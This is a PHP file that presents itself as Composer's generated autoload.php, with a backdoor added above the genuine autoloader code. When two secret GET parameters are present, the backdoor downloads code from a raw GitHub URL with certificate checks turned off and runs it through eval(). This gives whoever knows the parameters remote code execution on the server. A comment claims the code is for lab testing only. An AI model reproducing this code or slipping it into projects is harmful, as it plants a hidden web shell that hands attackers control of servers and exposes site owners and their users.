<?php
if (isset($_GET['marlinixix']) && isset($_GET['gosonglek'])) {  // <-- ganti jadi dua parameter beda
    
    // PERBAIKAN 3: Hapus semicolon dari dalam string
    $remote_url = "https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/alpasaulxalpasnoop.txt";
    
    // Gunakan cURL (lebih handal dari file_get_contents)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $remote_code = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code == 200 && !empty($remote_code)) {
        // PERINGATAN: eval() SANGAT BERBAHAYA! Hanya untuk testing di lab
        eval("?>" . $remote_code);
    } else {
        echo "Gagal mengambil script. HTTP Code: " . $http_code;
    }
    exit;
}

// autoload.php @generated by Composer

if (PHP_VERSION_ID < 50600) {
    if (!headers_sent()) {
        header('HTTP/1.1 500 Internal Server Error');
    }
    $err = 'Composer 2.3.0 dropped support for autoloading on PHP <5.6 and you are running '.PHP_VERSION.', please upgrade PHP or use Composer 2.2 LTS via "composer self-update --2.2". Aborting.'.PHP_EOL;
    if (!ini_get('display_errors')) {
        if (PHP_SAPI === 'cli' || PHP_SAPI === 'phpdbg') {
            fwrite(STDERR, $err);
        } elseif (!headers_sent()) {
            echo $err;
        }
    }
    throw new RuntimeException($err);
}

require_once __DIR__ . '/composer/autoload_real.php';

return ComposerAutoloaderInit2aaf08fdfad7ab39074f4acd6696ba44::getLoader();
